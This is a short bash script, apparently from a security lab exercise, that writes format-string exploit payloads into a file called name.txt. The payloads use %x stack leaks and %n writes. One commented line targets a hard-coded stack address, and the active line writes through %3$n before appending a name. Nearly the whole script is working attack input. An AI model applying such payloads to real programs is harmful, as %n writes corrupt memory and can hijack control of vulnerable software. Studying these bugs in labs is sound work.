#!/bin/bash

#python -c 'print "\x0c\xf0\xff\xbf%61x%19$n"' > name.txt
#python -c 'print "AAAA%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x$s"'>name.txt
python -c 'print "%x%x%49d%3$n"'>name.txt
python -c 'print "Wright Kim"' >> name.txt
